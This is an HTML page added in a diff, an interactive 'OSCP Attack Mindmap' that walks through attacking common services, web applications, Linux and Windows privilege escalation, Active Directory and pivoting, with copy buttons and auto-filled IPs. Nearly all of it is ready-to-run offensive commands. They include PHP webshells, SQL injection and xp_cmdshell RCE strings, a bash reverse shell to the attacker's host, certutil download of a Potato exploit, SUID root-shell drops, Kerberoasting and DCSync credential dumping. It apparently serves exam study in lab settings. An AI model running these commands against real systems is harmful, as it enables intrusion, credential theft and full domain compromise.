@@ -1,0 +1,285 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OSCP Attack Mindmap</title>
+<style>
+:root{--bg:#0d1117;--panel:#11161d;--panel2:#161c24;--hover:#1b2531;--text:#c9d3de;--head:#e8eef5;
+ --muted:#7d8794;--faint:#5a6472;--accent:#4f9cf9;--accent2:#e3a008;--ok:#56d364;--no:#f47067;
+ --border:#20262e;--border2:#2a323c;--code:#0a0e13;--mono:"SFMono-Regular",Consolas,Menlo,monospace;}
+*{box-sizing:border-box}
+html,body{margin:0;background:var(--bg);color:var(--text);font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;-webkit-font-smoothing:antialiased}
+#layout{display:flex;min-height:100vh}
+#side{width:280px;flex:0 0 280px;background:var(--panel);border-right:1px solid var(--border);height:100vh;position:sticky;top:0;overflow-y:auto}
+#brand{padding:16px 16px 10px}
+#brand .logo{font-weight:700;color:var(--head);font-size:15px}
+#brand .tag{color:var(--faint);font-size:11px;margin-top:2px}
+.vars{padding:8px 12px;border-bottom:1px solid var(--border);border-top:1px solid var(--border);display:grid;grid-template-columns:1fr 1fr;gap:5px}
+.vars input{background:var(--code);border:1px solid var(--border2);color:var(--text);border-radius:6px;padding:5px 7px;font-size:11.5px;width:100%;font-family:var(--mono)}
+.vars input:focus{border-color:var(--accent);outline:none}
+.grp{padding:9px 12px 2px;color:var(--accent2);font-size:10.5px;font-weight:700;letter-spacing:.6px;text-transform:uppercase}
+.item{display:flex;align-items:center;gap:8px;padding:6px 12px;cursor:pointer;color:var(--muted);font-size:13px;border-left:2px solid transparent}
+.item:hover{background:var(--hover);color:var(--text)}
+.item.active{background:var(--accent)10;color:var(--accent);border-left-color:var(--accent);background:#12233b}
+.item .port{margin-left:auto;font-size:10px;color:var(--faint);font-family:var(--mono)}
+#main{flex:1;min-width:0;padding:0 0 80px}
+#top{position:sticky;top:0;z-index:5;background:var(--bg);border-bottom:1px solid var(--border);padding:16px 30px}
+#ftitle{font-size:21px;font-weight:700;color:var(--head)}
+#fsub{color:var(--muted);font-size:13px;margin-top:3px}
+#flow{padding:22px 30px;max-width:900px}
+.step{position:relative;padding:0 0 8px 42px;margin-bottom:8px}
+.step:before{content:"";position:absolute;left:15px;top:30px;bottom:-8px;width:2px;background:var(--border2)}
+.step:last-child:before{display:none}
+.step .num{position:absolute;left:0;top:2px;width:31px;height:31px;border-radius:50%;background:var(--panel2);border:2px solid var(--accent);color:var(--accent);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px;z-index:1}
+.step .goal{font-weight:650;color:var(--head);font-size:15px;padding-top:4px}
+.step .note{color:var(--muted);font-size:13px;margin:3px 0 7px}
+.cmd{display:flex;align-items:flex-start;gap:8px;background:var(--code);border:1px solid var(--border);border-radius:8px;padding:8px 10px;margin:5px 0;font-family:var(--mono);font-size:12.5px}
+.cmd code{flex:1;white-space:pre-wrap;word-break:break-word;color:#c9d5e0}
+.cmd .cmt{color:var(--faint)}
+.cp{cursor:pointer;color:var(--muted);border:1px solid var(--border2);border-radius:5px;padding:1px 7px;font-size:10.5px;font-family:inherit;flex:0 0 auto}
+.cp:hover{color:var(--accent);border-color:var(--accent)}
+.branch{display:flex;gap:14px;flex-wrap:wrap;margin:6px 0 2px;font-size:12.5px}
+.branch span{display:inline-flex;gap:5px}
+.ok b{color:var(--ok)}.no b{color:var(--no)}
+.kbtag{display:inline-block;margin-top:8px;font-size:11px;color:var(--accent2);font-family:var(--mono)}
+.hint{background:#12233b;border:1px solid #1c3a5e;border-radius:8px;padding:9px 12px;color:#a9c9ee;font-size:12.5px;margin:14px 0}
+.empty{padding:60px 30px;color:var(--muted);text-align:center}
+@media(max-width:820px){#side{position:fixed;left:-300px;transition:left .2s;z-index:20}#side.open{left:0}#menuBtn{display:inline-flex!important}}
+#menuBtn{display:none;position:fixed;top:14px;right:14px;z-index:30;background:var(--accent);color:#fff;border:none;border-radius:8px;width:40px;height:38px;font-size:17px;cursor:pointer}
+</style>
+</head>
+<body>
+<button id="menuBtn" onclick="document.getElementById('side').classList.toggle('open')">☰</button>
+<div id="layout">
+ <aside id="side">
+  <div id="brand"><div class="logo">🗺️ OSCP Attack Mindmap</div><div class="tag">Click a service → the flow to hack it + commands</div></div>
+  <div class="vars">
+   <input id="v_target" placeholder="TARGET ip">
+   <input id="v_kali" placeholder="KALI ip (tun0)">
+   <input id="v_user" placeholder="USER">
+   <input id="v_pass" placeholder="PASS">
+   <input id="v_domain" placeholder="DOMAIN">
+   <input id="v_dc" placeholder="DC ip">
+  </div>
+  <nav id="nav"></nav>
+ </aside>
+ <div id="main">
+  <div id="top"><div id="ftitle">Pick a service on the left</div><div id="fsub">Your IPs up top auto-fill into every command.</div></div>
+  <div id="flow"><div class="empty">👈 Choose an open port / service / phase to see its full attack flow.<br><br>Each flow reads top-to-bottom: <b>enumerate → decide → exploit → escalate</b>, with the exact commands and what to do if a step fails.</div></div>
+ </div>
+</div>
+
+<script id="flows" type="application/json">
+{
+ "groups":[
+  {"name":"Entry by port","items":["ftp","ssh","smtp","dns","http","smb","snmp","ldap","kerberos","mssql","mysql","nfs","rdp","winrm","redis"]},
+  {"name":"Web attacks","items":["lfi","sqli","upload","cmdinj"]},
+  {"name":"Escalate & spread","items":["privlin","privwin","ad","pivot"]}
+ ],
+ "flows":{
+  "ftp":{"t":"FTP — port 21","s":"File transfer. First hope: anonymous login = free files, maybe a webshell upload.","steps":[
+   {"g":"Enumerate: version + is anonymous allowed?","c":["nmap -p21 -sCV --script ftp-anon {TARGET}"],"ok":"anon allowed → step 2","no":"note the exact version → step 4"},
+   {"g":"Log in anonymously and list everything","c":["ftp {TARGET}   # user: anonymous  pass: (blank)","# non-interactive full mirror:","wget -r ftp://anonymous:anonymous@{TARGET}/"],"ok":"got files → loot for creds/keys/source","no":"try guest/known creds"},
+   {"g":"Can you UPLOAD? (put) + is FTP root = web root?","note":"If yes, drop a webshell and browse it → RCE.","c":["# in ftp:  put shell.php","# then visit http://{TARGET}/shell.php?c=id"]},
+   {"g":"No anon → search the version for an exploit","c":["searchsploit <product> <version>","# vsftpd 2.3.4 → :) backdoor on 6200 | ProFTPD 1.3.5 → mod_copy webshell"],"ok":"exploit → shell","no":"reuse any found creds; move to another service"},
+   {"g":"Loot everything you downloaded","note":"Configs, .txt creds, backups, source, SSH keys. Every password → try EVERYWHERE.","kb":"[ENUM-FTP]"}
+  ]},
+  "ssh":{"t":"SSH — port 22","s":"Rarely the way IN — it's the PAYOFF. Find a password/key elsewhere, then log in.","steps":[
+   {"g":"Note the version (OS/distro hint)","c":["nmap -p22 -sCV {TARGET}"]},
+   {"g":"Have a password? Log in","c":["ssh {USER}@{TARGET}"]},
+   {"g":"Have a private key (id_rsa)? Fix perms + log in","c":["chmod 600 id_rsa","ssh -i id_rsa {USER}@{TARGET}"],"ok":"shell","no":"key has a passphrase → crack it (next)"},
+   {"g":"Key wants a passphrase → crack it","c":["ssh2john id_rsa > h.txt","john --wordlist=/usr/share/wordlists/rockyou.txt h.txt"]},
+   {"g":"Only creds you found elsewhere","note":"Password reuse wins. Don't brute SSH with full rockyou (slow/noisy).","kb":"[ENUM-SSH]"}
+  ]},
+  "smtp":{"t":"SMTP — ports 25/465/587","s":"Mail. Main OSCP use = harvest valid USERNAMES for AD attacks.","steps":[
+   {"g":"Enumerate users","c":["nmap -p25 --script smtp-enum-users {TARGET}","smtp-user-enum -M RCPT -U users.txt -t {TARGET}"]},
+   {"g":"Manual check by hand","c":["nc {TARGET} 25","# then type:  VRFY root    or    RCPT TO:<user>"]},
+   {"g":"Feed valid users into AD spray/roast","kb":"[ENUM-SMTP]"}
+  ]},
+  "dns":{"t":"DNS — port 53","s":"A zone transfer can dump every internal hostname. On AD, DNS reveals the DCs.","steps":[
+   {"g":"Attempt a zone transfer (the big win)","c":["dig axfr @{TARGET} <domain>","dnsrecon -d <domain> -a -n {TARGET}"],"ok":"got all records → add hostnames to /etc/hosts","no":"brute subdomains / SRV lookups"},
+   {"g":"Add every hostname you learn to /etc/hosts","c":["sudo sh -c 'echo \"{TARGET}  host.domain.local\" >> /etc/hosts'"]},
+   {"g":"AD? Find the Domain Controllers","c":["nslookup -type=SRV _ldap._tcp.<domain> {TARGET}"],"kb":"[ENUM-DNS]"}
+  ]},
+  "http":{"t":"HTTP / HTTPS — 80/443/8080","s":"The #1 foothold. Map the whole app, then pick the vuln.","steps":[
+   {"g":"Fingerprint the stack + version","c":["whatweb http://{TARGET}","curl -sI http://{TARGET}"],"ok":"known-vuln version → searchsploit it","no":"keep mapping"},
+   {"g":"Find hidden pages/files","c":["feroxbuster -u http://{TARGET} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,aspx,txt,html -n"],"ok":"login/upload/admin found → attack it","no":"read source + JS for endpoints/creds"},
+   {"g":"Find vhosts (if a hostname appears)","c":["ffuf -u http://{TARGET} -H \"Host: FUZZ.<domain>\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <size>"]},
+   {"g":"Pick the vuln from what the input DOES","note":"reflected→XSS/SSTI · file path→LFI · DB query→SQLi · OS cmd→cmd-inj · URL→SSRF · upload→webshell","branch":true,"c":["# jump to: LFI / SQLi / Upload / CmdInj flows in this mindmap"]},
+   {"g":"Version has a CVE? Research it","c":["searchsploit <product> <version>","# or type the CVE into OSCP-Copilot.html"],"kb":"[WEB-QUICK]"}
+  ]},
+  "smb":{"t":"SMB — ports 139/445","s":"Windows file sharing + the AD workhorse. Try no-password access first.","steps":[
+   {"g":"Identify: hostname, domain, OS, signing","c":["nxc smb {TARGET}"],"ok":"note domain (AD!) + signing:False (relay)","no":""},
+   {"g":"Null / guest session — free shares & users","c":["nxc smb {TARGET} -u '' -p '' --shares --users","nxc smb {TARGET} -u 'guest' -p '' --shares","smbclient -N -L //{TARGET}/"],"ok":"readable share → loot it (next)","no":"need creds → RID brute / other services"},
+   {"g":"Loot readable shares","c":["smbclient -N //{TARGET}/<share>","# inside: recurse ON; prompt OFF; mget *"],"note":"Hunt: Groups.xml (GPP cpassword), unattend.xml, .kdbx, scripts, web.config, configs."},
+   {"g":"Pull usernames with no creds (RID cycling)","c":["nxc smb {TARGET} -u '' -p '' --rid-brute"]},
+   {"g":"Have creds? Get a shell","c":["nxc smb {TARGET} -u {USER} -p {PASS}   # (Pwn3d!) = local admin","impacket-psexec {DOMAIN}/{USER}:{PASS}@{TARGET}","evil-winrm -i {TARGET} -u {USER} -p {PASS}"],"kb":"[ENUM-SMB]"},
+   {"g":"Old box? Check EternalBlue","c":["nmap --script smb-vuln-ms17-010 -p445 {TARGET}"]}
+  ]},
+  "snmp":{"t":"SNMP — port 161/UDP","s":"Low effort, high loot. The 'public' string often dumps process args WITH passwords.","steps":[
+   {"g":"Walk it with the default community string","c":["snmpwalk -v2c -c public {TARGET}","snmp-check {TARGET} -c public"],"ok":"read the output for creds/users/software","no":"brute the community string (next)"},
+   {"g":"Brute the community string","c":["onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {TARGET}"]},
+   {"g":"Mine process arguments for passwords","note":"OID 1.3.6.1.2.1.25.4.2.1.5 = running-process command lines → creds appear here.","kb":"[ENUM-SNMP]"}
+  ]},
+  "ldap":{"t":"LDAP — 389/636/3268","s":"The AD database over the wire. Anonymous bind can dump users + passwords-in-description.","steps":[
+   {"g":"Find the base DN","c":["ldapsearch -x -H ldap://{TARGET} -s base namingcontexts"]},
+   {"g":"Anonymous dump (users, descriptions=creds!)","c":["ldapsearch -x -H ldap://{TARGET} -b \"dc=corp,dc=local\""],"ok":"passwords in description → spray them","no":"need creds"},
+   {"g":"With creds: full dump + roast targets","c":["ldapdomaindump -u '{DOMAIN}\\\\{USER}' -p {PASS} {TARGET}","nxc ldap {TARGET} -u {USER} -p {PASS} --kerberoasting kr.txt --asreproast ar.txt"],"kb":"[ENUM-LDAP]"}
+  ]},
+  "kerberos":{"t":"Kerberos — port 88  🚨","s":"Port 88 = this is a DOMAIN CONTROLLER. Switch your whole mindset to AD.","steps":[
+   {"g":"FIRST fix clock skew (or everything errors)","c":["sudo ntpdate {TARGET}"]},
+   {"g":"AS-REP roast — needs NO password","c":["impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip {TARGET} -format hashcat -outputfile asrep.txt","hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"],"ok":"cracked → a real password","no":"need one valid cred for kerberoast"},
+   {"g":"Kerberoast — needs any ONE domain cred","c":["impacket-GetUserSPNs -request {DOMAIN}/{USER}:{PASS} -dc-ip {TARGET} -outputfile tgs.txt","hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt"]},
+   {"g":"Go to the full AD flow","c":["# see the 'Active Directory' node in this mindmap"],"kb":"[AD-QUICK]"}
+  ]},
+  "mssql":{"t":"MSSQL — port 1433","s":"With creds → xp_cmdshell = run Windows commands = RCE.","steps":[
+   {"g":"Test creds","c":["nxc mssql {TARGET} -u {USER} -p {PASS}"],"ok":"connect → step 2","no":"try sa / found creds; or SQLi in a web login"},
+   {"g":"Connect the client","c":["impacket-mssqlclient {USER}:{PASS}@{TARGET} -windows-auth"]},
+   {"g":"Enable + run xp_cmdshell (RCE)","c":["enable_xp_cmdshell","xp_cmdshell whoami","# or run a full powershell -e reverse shell here"],"ok":"command runs → get a reverse shell → often SeImpersonate → SYSTEM","no":"try EXEC AS LOGIN='sa' / linked servers"},
+   {"g":"Steal a hash (relay/crack)","c":["EXEC xp_dirtree '\\\\{KALI}\\x'   # catch on Responder (analyze mode)"],"kb":"[ENUM-MSSQL]"}
+  ]},
+  "mysql":{"t":"MySQL — port 3306","s":"Try weak creds; with FILE priv you can read/write files → webshell.","steps":[
+   {"g":"Try to log in (blank/root/toor)","c":["mysql -h {TARGET} -u root -p","nmap -p3306 --script mysql-empty-password {TARGET}"]},
+   {"g":"Dump app creds","c":["show databases;  use <db>;  show tables;  select * from users;"],"ok":"hashes → crack / reuse","no":"try FILE priv"},
+   {"g":"FILE priv → read/write files","c":["SELECT LOAD_FILE('/etc/passwd');","SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/sh.php';"],"kb":"[ENUM-MYSQL]"}
+  ]},
+  "nfs":{"t":"NFS — port 2049 (+111)","s":"Unix shares. no_root_squash = a direct path to root.","steps":[
+   {"g":"List the exports","c":["showmount -e {TARGET}"]},
+   {"g":"Mount + read (creds/keys/source)","c":["sudo mkdir -p /mnt/nfs","sudo mount -t nfs {TARGET}:/export /mnt/nfs -o nolock"]},
+   {"g":"no_root_squash → root via SUID drop","note":"As root on Kali, drop a SUID-root shell into the mount; run it on the target as low-priv = root.","c":["# on Kali (root): cp /bin/bash /mnt/nfs/rootbash; chmod +s /mnt/nfs/rootbash","# on target: /export/rootbash -p   → id = root"],"kb":"[ENUM-NFS]"}
+  ]},
+  "rdp":{"t":"RDP — port 3389","s":"Graphical login with creds. Great for running winPEAS visually / moving files.","steps":[
+   {"g":"Test the creds","c":["nxc rdp {TARGET} -u {USER} -p {PASS}"],"ok":"(Pwn3d!) → connect","no":"find creds elsewhere"},
+   {"g":"Connect to the desktop","c":["xfreerdp /v:{TARGET} /u:{USER} /p:{PASS} +clipboard /dynamic-resolution","# map a drive to transfer:  /drive:share,/tmp"],"kb":"[ENUM-RDP]"}
+  ]},
+  "winrm":{"t":"WinRM — 5985/5986","s":"Remote PowerShell IF your account has the right. Prime foothold once you have creds.","steps":[
+   {"g":"Validate the creds","c":["nxc winrm {TARGET} -u {USER} -p {PASS}"],"ok":"(Pwn3d!) → get a shell","no":"user lacks WinRM rights → use psexec/wmiexec instead"},
+   {"g":"Get the interactive shell","c":["evil-winrm -i {TARGET} -u {USER} -p {PASS}","# pass-the-hash:  evil-winrm -i {TARGET} -u {USER} -H <NTLM>"],"kb":"[ENUM-WINRM]"}
+  ]},
+  "redis":{"t":"Redis — port 6379","s":"In-memory DB, frequently NO auth. Can write files → webshell / SSH key / cron.","steps":[
+   {"g":"Connect (often no password)","c":["redis-cli -h {TARGET}","# then:  info ; config get dir ; keys *"]},
+   {"g":"Abuse file write (unauth)","note":"Set dir + dbfilename to the web root or ~/.ssh, then save → drop a webshell or authorized_keys.","kb":"[ENUM-REDIS]"}
+  ]},
+  "lfi":{"t":"Web · Local File Inclusion","s":"A param loads a file → read secrets, then turn into RCE.","steps":[
+   {"g":"Spot + confirm (param loads a file)","c":["http://{TARGET}/?page=/etc/passwd","http://{TARGET}/?page=../../../../etc/passwd"],"ok":"file contents show → LFI confirmed","no":"try ....// , null byte, \\ for Windows"},
+   {"g":"Read the app's own source (find creds/real bug)","c":["?page=php://filter/convert.base64-encode/resource=index.php   # then base64 -d"]},
+   {"g":"Turn LFI into RCE","c":["# log poisoning: set User-Agent to <?php system($_GET['c']);?> then:","?page=/var/log/apache2/access.log&c=id","# no logs? use the php_filter_chain generator"],"kb":"[WEB-LFI]"}
+  ]},
+  "sqli":{"t":"Web · SQL Injection","s":"Break the query → bypass login, dump creds, or (MSSQL) get RCE.","steps":[
+   {"g":"Detect: break it with a quote","c":["'","# error / changed page = injectable"],"ok":"error/change → injectable","no":"try in other params, POST body, headers"},
+   {"g":"Auth bypass (fast win on a login)","c":["' or 1=1-- -","admin'-- -"]},
+   {"g":"Find columns → dump data (union)","c":["' ORDER BY 1-- -   (increment til error = column count)","' UNION SELECT 1,2,3-- -   (see which print)","' UNION SELECT username,password FROM users-- -"]},
+   {"g":"MSSQL → RCE via xp_cmdshell","c":["'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'powershell -e <b64>';-- -"],"note":"⛔ sqlmap is BANNED on the exam — do it by hand.","kb":"[SQLI]"}
+  ]},
+  "upload":{"t":"Web · File Upload","s":"Land an executable file in a web-served path → webshell → shell.","steps":[
+   {"g":"Upload a webshell","c":["# PHP:  <?php system($_GET['c']); ?>   as shell.php","# ASP.NET box → shell.aspx ;  find where it lands (dir-brute /uploads)"]},
+   {"g":"Bypass filters if blocked","c":["shell.php3  shell.phtml  shell.php.jpg  shell.pHp","# Content-Type: image/png (php body) ; GIF89a prefix ; .htaccess remap"]},
+   {"g":"Trigger it → reverse shell","c":["http://{TARGET}/uploads/shell.php?c=<url-encoded reverse shell>"],"kb":"[WEB-UPLOAD]"}
+  ]},
+  "cmdinj":{"t":"Web · Command Injection","s":"Your input reaches the OS shell → run your own command.","steps":[
+   {"g":"Test separators","c":["; id","| id","&& id","`id`","$(id)","# blind? try:  ; sleep 5   or   ; curl http://{KALI}/x"],"ok":"output/delay/callback → confirmed","no":"try filter bypasses"},
+   {"g":"Bypass filters","c":["# spaces: ${IFS}   ; chars: echo <b64>|base64 -d|bash   ; quotes: \"; id;#"]},
+   {"g":"Get a reverse shell","c":["; bash -c 'bash -i >& /dev/tcp/{KALI}/443 0>&1'   # URL-ENCODE the whole thing"],"kb":"[WEB-CMDINJ]"}
+  ]},
+  "privlin":{"t":"Privilege Escalation · Linux","s":"Enumerate, then abuse one misconfig → root. Check the easy wins first.","steps":[
+   {"g":"Orient (first 4 commands, always)","c":["id ; sudo -l ; uname -a ; hostname"],"ok":"sudo -l shows something → GTFOBins it","no":"keep enumerating"},
+   {"g":"Sudo rights → GTFOBins","c":["sudo -l","# look the allowed binary up on GTFOBins → copy the shell escape"],"ok":"root","no":"next vector"},
+   {"g":"SUID binaries","c":["find / -perm -4000 -type f 2>/dev/null","# unusual/custom ones → GTFOBins (SUID) or strings/ltrace for a hijack"]},
+   {"g":"Capabilities","c":["getcap -r / 2>/dev/null","# cap_setuid on python/perl → python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"]},
+   {"g":"Cron / writable scripts","c":["cat /etc/crontab ; ls -la /etc/cron.* ; ./pspy64","# writable script run as root → append: cp /bin/bash /tmp/rb; chmod +s /tmp/rb"]},
+   {"g":"Automate + creds hunt","c":["./linpeas.sh | tee linpeas.txt   # read RED/YELLOW","grep -rniE 'password|secret' /home /var/www /opt /etc 2>/dev/null"]},
+   {"g":"Kernel exploit — LAST resort","c":["uname -r   # → searchsploit / linux-exploit-suggester2 (can crash the box)"],"kb":"[LINUX-PRIVESC]"}
+  ]},
+  "privwin":{"t":"Privilege Escalation · Windows","s":"Check your privileges first — SeImpersonate is a near-instant SYSTEM.","steps":[
+   {"g":"Check your privileges + identity","c":["whoami /priv","whoami /all"],"ok":"SeImpersonate/SeBackup → step 2","no":"services/registry/creds"},
+   {"g":"SeImpersonate → Potato → SYSTEM","c":["certutil -urlcache -split -f http://{KALI}/PrintSpoofer64.exe ps.exe",".\\ps.exe -c \"C:\\Windows\\Temp\\rev.exe\"   # (-i fails? use -c + a reverse-shell exe)"],"note":"See [POTATO-GOTCHAS] for the -c/reverse-shell trick.","ok":"nt authority\\system","no":""},
+   {"g":"Service misconfigs","c":["# PowerUp: Invoke-AllChecks","wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\"   # unquoted paths"]},
+   {"g":"Stored creds / autologon","c":["cmdkey /list","reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"","dir /s /b C:\\*unattend* C:\\*.kdbx C:\\*.config 2>nul"]},
+   {"g":"AlwaysInstallElevated","c":["reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated","reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated   # both =1 → .msi as SYSTEM"]},
+   {"g":"Automate","c":[".\\winPEASx64.exe > wp.txt   # read RED"],"kb":"[WINDOWS-PRIVESC]"}
+  ]},
+  "ad":{"t":"Active Directory — the 40-pt set","s":"The loop: enumerate → map → get a cred → see what it unlocks → move up → own the DC.","steps":[
+   {"g":"Enumerate the domain (with one cred)","c":["nxc smb {DC} -u {USER} -p {PASS} --users --groups --pass-pol --shares","nxc ldap {DC} -u {USER} -p {PASS} --users   # descriptions = creds"]},
+   {"g":"Map it — BloodHound (do this EARLY)","c":["bloodhound-python -u {USER} -p {PASS} -d {DOMAIN} -ns {DC} -c all --zip","# import → mark Owned → 'Shortest path to Domain Admins'"]},
+   {"g":"Two free credential attacks","c":["impacket-GetNPUsers {DOMAIN}/ -no-pass -usersfile users.txt -dc-ip {DC}   # AS-REP (no creds)","impacket-GetUserSPNs -request {DOMAIN}/{USER}:{PASS} -dc-ip {DC}   # Kerberoast (1 cred)","# crack: hashcat -m 18200 / -m 13100"]},
+   {"g":"Spray every cred everywhere","c":["nxc smb <subnet> -u {USER} -p {PASS} --continue-on-success   # find (Pwn3d!)"],"ok":"(Pwn3d!) on a host → shell there + loot more creds","no":"abuse a BloodHound ACL edge"},
+   {"g":"Move laterally + loot each host","c":["evil-winrm -i <host> -u {USER} -p {PASS}","nxc smb <host> -u {USER} -p {PASS} --sam --lsa   # or secretsdump"]},
+   {"g":"Own the domain (DCSync)","c":["impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{DC}   # needs replication rights","# → Administrator NTLM + krbtgt → PtH the DC → read all proof.txt"],"kb":"[AD-QUICK]"}
+  ]},
+  "pivot":{"t":"Pivoting — reach hidden networks","s":"Owned a dual-homed host? Tunnel THROUGH it so your Kali tools reach the internal subnet.","steps":[
+   {"g":"Find the hidden network on the owned host","c":["ipconfig /all   (Windows)   |   ip a ; ip route   (Linux)","arp -a   # other hosts it talks to"],"ok":"a second subnet (172.16.x / 10.x) → tunnel to it","no":""},
+   {"g":"Ligolo-ng (cleanest — a real route)","c":["# Kali: sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert","# target: ./agent -connect {KALI}:11601 -ignore-cert","# Kali: sudo ip route add <subnet>/24 dev ligolo   → then nxc/nmap NATIVELY"]},
+   {"g":"Chisel (SOCKS + proxychains) alternative","c":["# Kali: ./chisel server -p 8000 --reverse","# target: ./chisel client {KALI}:8000 R:socks","proxychains nxc smb <subnet>/24"]},
+   {"g":"Enumerate + spray the new subnet","c":["nxc smb <subnet>/24 -u {USER} -p {PASS}   # (native via ligolo, or proxychains via chisel)","proxychains nmap -sT -Pn -n -p 445,3389,5985,88 <host>   # TCP-connect only over SOCKS"],"kb":"[PIVOT-QUICK]"}
+  ]}
+ }
+}
+</script>
+
+<script>
+var v={TARGET:'{TARGET}',KALI:'{KALI}',USER:'{USER}',PASS:'{PASS}',DOMAIN:'{DOMAIN}',DC:'{DC}'};
+function readVars(){
+ v.TARGET=(val('v_target')||'{TARGET}');v.KALI=(val('v_kali')||'{KALI}');v.USER=(val('v_user')||'{USER}');
+ v.PASS=(val('v_pass')||'{PASS}');v.DOMAIN=(val('v_domain')||'{DOMAIN}');v.DC=(val('v_dc')||'{DC}');
+}
+function val(id){return document.getElementById(id).value.trim();}
+function sub(c){return c.replace(/\{TARGET\}/g,v.TARGET).replace(/\{KALI\}/g,v.KALI).replace(/\{USER\}/g,v.USER).replace(/\{PASS\}/g,v.PASS).replace(/\{DOMAIN\}/g,v.DOMAIN).replace(/\{DC\}/g,v.DC);}
+function esc(s){return s.replace(/[&<>]/g,function(m){return{'&':'&amp;','<':'&lt;','>':'&gt;'}[m];});}
+var DATA=JSON.parse(document.getElementById('flows').textContent);
+var FLOWS=DATA.flows;
+
+function buildNav(){
+ var nav=document.getElementById('nav'),h='';
+ DATA.groups.forEach(function(g){
+  h+='<div class="grp">'+esc(g.name)+'</div>';
+  g.items.forEach(function(k){var f=FLOWS[k];if(!f)return;
+   var port=(f.t.match(/—\s*(port[s]?\s*)?([\d/]+)/i)||[])[2]||'';
+   h+='<div class="item" data-k="'+k+'" onclick="showFlow(\''+k+'\')"><span>'+esc(f.t.split(' — ')[0].split(' · ').slice(-1)[0])+'</span>'+(port?'<span class="port">'+esc(port)+'</span>':'')+'</div>';
+  });
+ });
+ nav.innerHTML=h;
+}
+function showFlow(k){
+ readVars();
+ var f=FLOWS[k];if(!f)return;
+ document.querySelectorAll('.item').forEach(function(el){el.classList.toggle('active',el.getAttribute('data-k')===k);});
+ document.getElementById('ftitle').textContent=f.t;
+ document.getElementById('fsub').textContent=f.s;
+ var h='';
+ f.steps.forEach(function(st,i){
+  h+='<div class="step"><div class="num">'+(i+1)+'</div>';
+  h+='<div class="goal">'+esc(st.g)+'</div>';
+  if(st.note)h+='<div class="note">'+esc(st.note)+'</div>';
+  (st.c||[]).forEach(function(cmd){
+   var full=sub(cmd), isC=/^\s*#/.test(cmd);
+   h+='<div class="cmd"><code class="'+(isC?'cmt':'')+'">'+esc(full)+'</code>'+(isC?'':'<button class="cp" onclick="cp(this)">copy</button>')+'</div>';
+  });
+  if(st.ok||st.no){
+   h+='<div class="branch">';
+   if(st.ok)h+='<span class="ok"><b>✓ works:</b> '+esc(st.ok)+'</span>';
+   if(st.no)h+='<span class="no"><b>✗ fails:</b> '+esc(st.no)+'</span>';
+   h+='</div>';
+  }
+  if(st.kb)h+='<div class="kbtag">📖 full detail in KB: '+esc(st.kb)+'</div>';
+  h+='</div>';
+ });
+ h+='<div class="hint">💡 This is the <b>flow</b>, not a script — do the enumerate steps, then branch on what you find. Every command auto-fills your IPs (set them top-left). Full explanations live in <b>OSCP-KB.html</b> under the 📖 tags.</div>';
+ document.getElementById('flow').innerHTML=h;
+ document.getElementById('side').classList.remove('open');
+ window.scrollTo(0,0);
+}
+function cp(btn){
+ var t=btn.previousElementSibling.textContent;
+ navigator.clipboard.writeText(t).then(function(){var o=btn.textContent;btn.textContent='✓';setTimeout(function(){btn.textContent=o;},900);});
+}
+// re-render on var change so commands update live
+['v_target','v_kali','v_user','v_pass','v_domain','v_dc'].forEach(function(id){
+ document.getElementById(id).addEventListener('input',function(){
+  var a=document.querySelector('.item.active');if(a)showFlow(a.getAttribute('data-k'));
+ });
+});
+buildNav();
+</script>
+</body>
+</html>
